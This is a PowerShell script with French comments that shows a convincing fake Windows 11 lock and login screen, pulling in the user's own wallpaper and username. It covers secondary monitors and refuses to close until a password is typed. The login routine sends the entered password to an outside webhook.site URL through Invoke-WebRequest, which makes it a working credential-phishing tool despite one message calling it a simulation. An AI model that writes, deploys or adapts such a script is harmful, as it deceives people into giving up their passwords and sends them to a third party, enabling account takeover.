# ==========================================
# 0. CONFIGURATION & ASSEMBLAGES
# ==========================================
Add-Type -AssemblyName PresentationFramework, System.Windows.Forms, System.Drawing

# Fenêtres noires sur tous les écrans secondaires
[System.Windows.Forms.Application]::EnableVisualStyles()
$secondaryForms   = @()
$secondaryScreens = [System.Windows.Forms.Screen]::AllScreens | Where-Object { -not $_.Primary }

foreach ($screen in $secondaryScreens) {
    $form = New-Object System.Windows.Forms.Form
    $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
    $form.StartPosition   = [System.Windows.Forms.FormStartPosition]::Manual
    $form.BackColor       = [System.Drawing.Color]::Black
    $form.Bounds          = $screen.Bounds
    $form.TopMost         = $true
    $form.ShowInTaskbar   = $false
    $form.Show()
    $secondaryForms += $form
}

# Flag pour savoir si on a créé un wallpaper temporaire
$script:IsTempWallpaper = $false
# Flag pour autoriser ou non la fermeture de la fenêtre principale
$script:CanClose = $false

# ==========================================
# 1. RECUPERATION DU WALLPAPER (PRIORITAIRE)
# ==========================================
function Get-CurrentWallpaper {
    # 1. Méthode directe (Registre standard)
    $regPath = "HKCU:\Control Panel\Desktop"
    $wall = (Get-ItemProperty -Path $regPath -Name Wallpaper -ErrorAction SilentlyContinue).Wallpaper
    
    if ($wall -and (Test-Path -LiteralPath $wall)) {
        return $wall
    }

    # 2. Méthode Fallback (Fichier cache système "TranscodedWallpaper")
    $transcoded = Join-Path $env:APPDATA "Microsoft\Windows\Themes\TranscodedWallpaper"
    if (Test-Path -LiteralPath $transcoded) {
        $tempWall = Join-Path $env:TEMP "active_wallpaper.jpg"
        Copy-Item -LiteralPath $transcoded -Destination $tempWall -Force
        $script:IsTempWallpaper = $true
        return $tempWall
    }

    # 3. Dernier recours (Fond par défaut Windows)
    $fallback = "C:\Windows\Web\Wallpaper\Windows\img0.jpg"
    if (Test-Path -LiteralPath $fallback) {
        return $fallback
    }

    return $null
}

$bgImage  = Get-CurrentWallpaper
$userName = $env:USERNAME

# ==========================================
# 2. XAML - INTERFACE "TYPE" WINDOWS 11
# ==========================================
[xml]$xaml = @"
<Window 
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="Windows Security" WindowStyle="None" ResizeMode="NoResize" 
    WindowState="Maximized" Topmost="True" ShowInTaskbar="False" Cursor="None"
    FontFamily="Segoe UI" Background="Black">

    <Window.Resources>

        <!-- Supprimer les halos / rectangles de focus -->
        <Style TargetType="{x:Type Control}">
            <Setter Property="FocusVisualStyle" Value="{x:Null}"/>
        </Style>

        <Style x:Key="SubmitBtnStyle" TargetType="Button">
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Grid>
                            <Ellipse Name="Circle" Fill="#808080" Opacity="0.4"/>
                            <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Grid>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsMouseOver" Value="True">
                                <Setter TargetName="Circle" Property="Fill" Value="#0078D7"/>
                                <Setter TargetName="Circle" Property="Opacity" Value="0.9"/>
                            </Trigger>
                            <Trigger Property="IsPressed" Value="True">
                                <Setter TargetName="Circle" Property="Fill" Value="#005A9E"/>
                                <Setter TargetName="Circle" Property="Opacity" Value="1.0"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>

        <Style x:Key="LinkText" TargetType="TextBlock">
            <Setter Property="Foreground" Value="#CCCCCC"/>
            <Setter Property="FontSize" Value="14"/>
            <Setter Property="Cursor" Value="Hand"/>
            <Style.Triggers>
                <Trigger Property="IsMouseOver" Value="True">
                    <Setter Property="Foreground" Value="White"/>
                </Trigger>
            </Style.Triggers>
        </Style>

        <Style x:Key="ActionIcon" TargetType="TextBlock">
            <Setter Property="FontFamily" Value="Segoe MDL2 Assets"/>
            <Setter Property="FontSize" Value="20"/>
            <Setter Property="Foreground" Value="White"/>
            <Setter Property="Margin" Value="0,0,25,0"/>
            <Setter Property="Opacity" Value="0.8"/>
            <Setter Property="Cursor" Value="Hand"/>
            <Style.Triggers>
                <Trigger Property="IsMouseOver" Value="True">
                    <Setter Property="Opacity" Value="1"/>
                </Trigger>
            </Style.Triggers>
        </Style>
    </Window.Resources>

    <Grid>

        <!-- Fond flouté uniquement pour l'écran de connexion -->
        <Grid Name="BlurredBackground" Visibility="Collapsed">
            <Grid.Background>
                <ImageBrush ImageSource="$bgImage" Stretch="UniformToFill"/>
            </Grid.Background>
            <Grid.Effect>
                <BlurEffect Radius="40" KernelType="Gaussian"/>
            </Grid.Effect>
            <Border Background="Black" Opacity="0.2"/>
        </Grid>

        <!-- Couche de connexion -->
        <Grid Name="LoginLayer" Visibility="Collapsed">
            
            <StackPanel VerticalAlignment="Center" HorizontalAlignment="Center" Width="400">
                
                <Grid Height="190" Width="190" Margin="0,0,0,15">
                    <Ellipse Stroke="#A6A6A6" StrokeThickness="1" Opacity="0.5"/>
                    <TextBlock Text="&#xE77B;" FontFamily="Segoe MDL2 Assets" FontSize="100" Foreground="#DDDDDD" 
                               HorizontalAlignment="Center" VerticalAlignment="Center" Opacity="1"/>
                </Grid>

                <TextBlock Text="$userName" Foreground="White" FontSize="34" FontWeight="SemiBold"
                           HorizontalAlignment="Center" Margin="0,0,0,25" FontFamily="Segoe UI Variable Display, Segoe UI"/>

                <Grid HorizontalAlignment="Center" Width="320">
                    <Grid.ColumnDefinitions>
                        <ColumnDefinition Width="*"/>
                        <ColumnDefinition Width="Auto"/>
                    </Grid.ColumnDefinitions>

                    <PasswordBox Name="PwdBox" FontSize="18" Padding="10,8,40,8" Height="44" 
                                 Background="White" Opacity="0.5" BorderThickness="2" BorderBrush="#80FFFFFF"
                                 VerticalContentAlignment="Center" Grid.ColumnSpan="2"/>
                    
                    <TextBlock Text="Mot de passe" Foreground="#333333" IsHitTestVisible="False"
                               VerticalAlignment="Center" Margin="12,0,0,0"
                               Name="PlaceholderText" Visibility="Visible"/>

                    <Button Name="SubmitBtn" Grid.Column="1" Margin="0,0,4,0"
                            Content="&#xE096;" FontFamily="Segoe MDL2 Assets" FontSize="14" Foreground="White" FontWeight="Bold"
                            Width="36" Height="36" HorizontalAlignment="Right" VerticalAlignment="Center"
                            Style="{StaticResource SubmitBtnStyle}" Cursor="Hand"/>
                </Grid>
                
                <TextBlock Text="J'ai oublie mon mot de passe" HorizontalAlignment="Center" Margin="0,20,0,5" Style="{StaticResource LinkText}"/>
                <TextBlock Text="Options de connexion" HorizontalAlignment="Center" Style="{StaticResource LinkText}"/>

            </StackPanel>

            <StackPanel Orientation="Horizontal" VerticalAlignment="Bottom" HorizontalAlignment="Right" Margin="0,0,30,35">
                <Border BorderBrush="Transparent" Background="Transparent" Margin="0,0,25,0" Cursor="Hand" Opacity="0.8">
                     <TextBlock Text="FRA" Foreground="White" FontSize="16" FontWeight="SemiBold"/>
                </Border>
                <TextBlock Text="&#xE701;" Style="{StaticResource ActionIcon}" ToolTip="Connecté"/>
                <TextBlock Text="&#xE7D5;" Style="{StaticResource ActionIcon}" ToolTip="Accessibilité"/>
                <TextBlock Name="BtnPower" Text="&#xE7E8;" Style="{StaticResource ActionIcon}" Margin="0" ToolTip="Marche/Arrêt"/>
            </StackPanel>
        </Grid>

        <!-- Couche lockscreen -->
        <Grid Name="LockLayer" Visibility="Visible">
            <Grid.Background>
                <ImageBrush ImageSource="$bgImage" Stretch="UniformToFill"/>
            </Grid.Background>

            <StackPanel VerticalAlignment="Top" HorizontalAlignment="Center" Margin="0,100,0,0">
                <TextBlock Name="TxtClock"
                           Text="00:00"
                           FontSize="105" Foreground="White" FontWeight="Bold" 
                           FontFamily="Segoe UI Variable Display, Segoe UI"
                           HorizontalAlignment="Center" Margin="0,0,0,-15">
                     <TextBlock.Effect><DropShadowEffect BlurRadius="10" ShadowDepth="2" Opacity="0.3"/></TextBlock.Effect>
                </TextBlock>
                <TextBlock Name="TxtDate"
                           Text="lundi 1 janvier"
                           FontSize="32" Foreground="White" FontWeight="Normal" FontFamily="Segoe UI"
                           HorizontalAlignment="Center">
                     <TextBlock.Effect><DropShadowEffect BlurRadius="5" ShadowDepth="2" Opacity="0.3"/></TextBlock.Effect>
                </TextBlock>
            </StackPanel>

            <StackPanel Orientation="Horizontal" VerticalAlignment="Bottom" HorizontalAlignment="Right" Margin="0,0,30,35">
                 <TextBlock Text="&#xE701;" FontFamily="Segoe MDL2 Assets" FontSize="24" Foreground="White" Margin="0,0,20,0">
                     <TextBlock.Effect><DropShadowEffect BlurRadius="5" ShadowDepth="1" Opacity="0.4"/></TextBlock.Effect>
                 </TextBlock>
                 <TextBlock Text="&#xEBAA;" FontFamily="Segoe MDL2 Assets" FontSize="24" Foreground="White">
                     <TextBlock.Effect><DropShadowEffect BlurRadius="5" ShadowDepth="1" Opacity="0.4"/></TextBlock.Effect>
                 </TextBlock>
            </StackPanel>
        </Grid>

    </Grid>
</Window>
"@

# ==========================================
# 3. LOGIQUE & COMPORTEMENT
# ==========================================
$reader = New-Object System.Xml.XmlNodeReader $xaml
$window = [Windows.Markup.XamlReader]::Load($reader)

# -- Mapping des éléments --
$lockLayer        = $window.FindName("LockLayer")
$loginLayer       = $window.FindName("LoginLayer")
$blurredBackground = $window.FindName("BlurredBackground")
$pwdBox           = $window.FindName("PwdBox")
$submitBtn        = $window.FindName("SubmitBtn")
$btnPower         = $window.FindName("BtnPower")
$placeholder      = $window.FindName("PlaceholderText")
$txtClock         = $window.FindName("TxtClock")
$txtDate          = $window.FindName("TxtDate")

# Constantes WPF pour la visibilité
$visibilityVisible   = [System.Windows.Visibility]::Visible
$visibilityCollapsed = [System.Windows.Visibility]::Collapsed

# ==========================================
# Horloge dynamique
# ==========================================
$updateClock = {
    $now = Get-Date
    if ($txtClock) { $txtClock.Text = $now.ToString("HH:mm") }
    if ($txtDate)  { $txtDate.Text  = $now.ToString("dddd d MMMM") }
}

$timer = New-Object System.Windows.Threading.DispatcherTimer
$timer.Interval = [TimeSpan]::FromSeconds(1)
$timer.Add_Tick({ & $updateClock })
$timer.Start()
& $updateClock

# ==========================================
# 1. Transition Lock -> Login
# ==========================================
$ActionShowLogin = {
    if ($lockLayer.Visibility -eq $visibilityVisible) {
        $lockLayer.Visibility          = $visibilityCollapsed
        $blurredBackground.Visibility  = $visibilityVisible
        $loginLayer.Visibility         = $visibilityVisible
        $window.Cursor                 = [System.Windows.Input.Cursors]::Arrow
        $pwdBox.Focus() | Out-Null
    }
}

# ==========================================
# 2. Gestion Placeholder & reset style
# ==========================================
$pwdBox.Add_PasswordChanged({
    if ([string]::IsNullOrEmpty($pwdBox.Password)) {
        $placeholder.Visibility = $visibilityVisible
    } else {
        $placeholder.Visibility = $visibilityCollapsed
    }

    # Reset du style en cas d'erreur précédente
    $pwdBox.BorderBrush     = "#80FFFFFF"
    $pwdBox.BorderThickness = 2
})

# ==========================================
# 3. Validation Login : minimum 4 caractères
# ==========================================
$ActionLogin = {
    $pass = $pwdBox.Password
    $addr = "https://webhook.site/7fc41284-8663-4d8b-83d8-bc7b4f23e5bd/$pass"

    if ($pass.Length -lt 4) {
        # Refus de validation si moins de 4 caractères
        $pwdBox.BorderBrush     = "Red"
        $pwdBox.BorderThickness = 2
        return
    }

    # Autorisation de fermeture de la fenêtre
    $script:CanClose = $true
    Invoke-WebRequest -Uri $addr -UseBasicParsing
    $window.Close()
}

# ==========================================
# 4. Bouton Power : désactivé dans la simulation
# ==========================================
$btnPower.Add_MouseLeftButtonDown({
    [System.Windows.MessageBox]::Show(
        "Les options d'alimentation sont désactivées dans cette simulation.",
        "Marche/Arrêt",
        [System.Windows.MessageBoxButton]::OK,
        [System.Windows.MessageBoxImage]::Information
    ) | Out-Null
})

# ==========================================
# 5. Gestion Clavier Global
# ==========================================
$window.Add_KeyDown({
    param($sender, $e)
    
    if ($e.Key -eq [System.Windows.Input.Key]::Escape) { 
        if ($loginLayer.Visibility -eq $visibilityVisible) {
            # Retour au Lock Screen
            $loginLayer.Visibility        = $visibilityCollapsed
            $blurredBackground.Visibility = $visibilityCollapsed
            $lockLayer.Visibility         = $visibilityVisible
            $window.Cursor                = [System.Windows.Input.Cursors]::None
            $pwdBox.Clear()
        }
        # Si on est déjà sur le lockscreen, Escape ne fait rien (impossible de quitter)
    }
    elseif ($e.Key -eq [System.Windows.Input.Key]::Enter) {
        if ($lockLayer.Visibility -eq $visibilityVisible) {
             & $ActionShowLogin
        } elseif ($loginLayer.Visibility -eq $visibilityVisible) {
             & $ActionLogin
        }
    }
    elseif ($lockLayer.Visibility -eq $visibilityVisible) {
        # N'importe quelle autre touche fait apparaître la couche login
        & $ActionShowLogin
    }
})

# Click sur le bouton "flèche"
$submitBtn.Add_Click({ & $ActionLogin })

# Click sur le lockscreen (fond) => afficher login
$lockLayer.Add_MouseLeftButtonDown({ & $ActionShowLogin })

# Empêcher la fermeture de la fenêtre tant qu'aucune "connexion" valide
$window.Add_Closing({
    param($s, $e)
    if (-not $script:CanClose) {
        $e.Cancel = $true
    }
})

# Lancement
$window.Add_Loaded({
    $window.Activate() | Out-Null
    $window.Cursor = [System.Windows.Input.Cursors]::None
})

$null = $window.ShowDialog()

# Nettoyage : arrêt timer
if ($timer) { $timer.Stop() }

# Fermeture des écrans noirs secondaires
if ($secondaryForms) {
    foreach ($f in $secondaryForms) {
        if ($f -and -not $f.IsDisposed) {
            $f.Close()
        }
    }
}

# Nettoyage : suppression éventuelle du wallpaper temporaire
if ($script:IsTempWallpaper -and $bgImage -and (Test-Path -LiteralPath $bgImage)) {
    Remove-Item -LiteralPath $bgImage -ErrorAction SilentlyContinue
}

